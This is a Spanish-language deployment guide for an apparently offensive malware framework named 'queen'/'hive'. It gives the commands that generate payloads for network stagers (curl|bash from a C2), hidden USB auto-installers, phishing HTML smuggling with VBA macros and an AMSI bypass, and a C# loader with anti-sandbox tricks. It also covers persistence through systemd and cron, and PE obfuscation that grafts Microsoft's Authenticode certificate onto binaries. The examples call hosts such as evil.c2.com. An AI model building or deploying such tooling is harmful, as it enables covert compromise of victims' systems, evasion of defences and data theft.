# Deployment Guide

## Build

```bash
cargo build --release --workspace                  # Linux
cargo build --release --target x86_64-pc-windows-gnu -p queen  # Windows
```

## Scripts de despliegue

Todos los scripts están en `scripts/`:

| Script | Propósito |
|--------|-----------|
| `deploy.sh` | Genera payloads para 4 vectores de ataque |
| `build_payload.sh` | Stager monolítico auto-extraíble (wrapper de deploy.sh) |
| `launch_colony.sh` | Despliegue local vía Docker Compose |
| `obfuscate_pe.py` | PE obfuscator post-compilación |

## Vectores (`deploy.sh`)

### Network — Stager remoto

```bash
./scripts/deploy.sh network                          # Linux
./scripts/deploy.sh network --windows --obfuscate    # Windows + PE obfuscation
```

Output en `payloads/network/`:

| Archivo | Propósito |
|---------|-----------|
| `stager.sh` | Script bash que descarga y ejecuta payload desde C2 |
| `payload.b64` | Manifiesto cifrado (XOR + gzip + base64) |
| `oneliner.txt` | curl \| bash one-liner |

### USB — Auto-instalador

```bash
./scripts/deploy.sh usb --windows
./scripts/deploy.sh usb
```

Output en `payloads/usb/`:

| Archivo | Propósito |
|---------|-----------|
| `.install.sh` | Stager Linux (oculto) — bash auto-extrae todo |
| `manifest.dat` | Todos los bins cifrados (XOR + gzip) |
| `readme.pdf.lnk.ps1` | Stager Windows PowerShell |

**Uso en target Linux:**
```bash
bash /media/pendrive/.install.sh
```

**Uso en target Windows:**
```powershell
powershell -ExecutionPolicy Bypass -File D:\readme.pdf.lnk.ps1
```

Ambos extraen todos los agentes en `/tmp/.h/` (Linux) o `%TEMP%\.h\` (Windows) y ejecutan `queen`.

### Phishing — HTML smuggling + VBA

```bash
./scripts/deploy.sh phishing --c2-host mi-c2.com --c2-port 443
```

Output en `payloads/phishing/`:

| Archivo | Propósito |
|---------|-----------|
| `invoice_<ts>.html` | Página HTML con JavaScript que descarga y ejecuta stager |
| `macro_hive.bas` | Macro VBA para Office con AMSI bypass + descarga |

### EXE — C# loader + payload cifrado

```bash
./scripts/deploy.sh exe --windows                    # C# loader
./scripts/deploy.sh exe --windows --obfuscate         # + PE obfuscation
```

Output en `payloads/executable/`:

| Archivo | Propósito |
|---------|-----------|
| `loader.cs` | C# v2: API hashing, delay anti-sandbox 2-5s, AMSI patch, CreateNoWindow |
| `queen.b64` | Queen cifrado (XOR + gzip + base64) |
| `compile.sh` | Script de compilación para Linux (mcs) |
| `compile.bat` | Script de compilación para Windows (csc) |

**Compilar y distribuir:**
```bash
cd payloads/executable
bash compile.sh                          # → hive_loader.exe
# Distribuir hive_loader.exe + queen.b64 juntos
```

## Stager monolítico (`build_payload.sh`)

Genera un único script auto-extraíble con todos los bins embebidos:

```bash
./scripts/build_payload.sh                          # Linux
./scripts/build_payload.sh --windows --obfuscate    # Windows + PE obfuscation
./scripts/build_payload.sh --output colony.sh       # Nombre custom

# En target:
bash colony.sh
```

El stager se auto-extrae en `/tmp/.hive/`, lanza C2 + todos los agentes, y soporta persistencia:

```bash
HIVE_PERSIST=1 bash colony.sh    # systemd user service + cron
```

## PE Obfuscation

Post-procesa un .exe compilado aplicando 8 técnicas polimórficas:

```bash
./scripts/obfuscate_pe.py input.exe -o output.exe
./scripts/obfuscate_pe.py input.exe --no-overlay --no-dummies   # Desactivar técnicas
./scripts/obfuscate_pe.py input.exe -o output.exe --quiet       # Solo SHA256
```

Técnicas:

| Técnica | Flag para desactivar | Qué hace |
|---------|---------------------|----------|
| Sección renaming | `--no-rename` | Nombres aleatorios 8 chars |
| Overlay entrópico | `--no-overlay` | 2-10KB datos aleatorios al final |
| Dummy sections | `--no-dummies` | 1-3 secciones falsas |
| Rich header scrub | `--no-rich` | Elimina metadatos MSVC |
| Debug directory kill | `--no-debug` | Elimina entradas de depuración |
| Cert injection | `--no-cert` | Firma Authenticode de Microsoft (ntdll.dll) |
| Entropy normalization | `--no-entropy` | Padding con ceros en gaps |
| Checksum fix | `--no-checksum` | Recalcula checksum PE |

Cada build produce hashes únicos (polimorfismo). El certificado se extrae automáticamente de `C:\Windows\System32\ntdll.dll` (desde WSL).

## Opciones comunes

| Flag | Aplica a | Descripción |
|------|----------|-------------|
| `--windows` | deploy.sh, build_payload.sh | Target Windows (.exe) |
| `--obfuscate` | deploy.sh, build_payload.sh | PE obfuscation (requiere --windows) |
| `--c2-host HOST` | Todos | C2 hostname (default: your-c2.com) |
| `--c2-port PORT` | Todos | C2 port (default: 8444) |
| `--output FILE` | build_payload.sh | Nombre del stager output |

## Ejemplos completos

```bash
# 1. Todo en uno (Linux)
./scripts/deploy.sh all

# 2. USB para Windows con ofuscación
./scripts/build_payload.sh --windows --obfuscate --output usb_payload.sh

# 3. Phishing con C2 custom
./scripts/deploy.sh phishing --c2-host evil.c2.com --c2-port 443

# 4. Solo PE obfuscation manual
./scripts/obfuscate_pe.py payloads/queen.exe -o payloads/queen_obf.exe

# 5. Pipeline completa: build → obfuscate → C# loader
cargo build --release --target x86_64-pc-windows-gnu -p queen
./scripts/deploy.sh exe --windows --obfuscate --c2-host 10.0.0.5
```
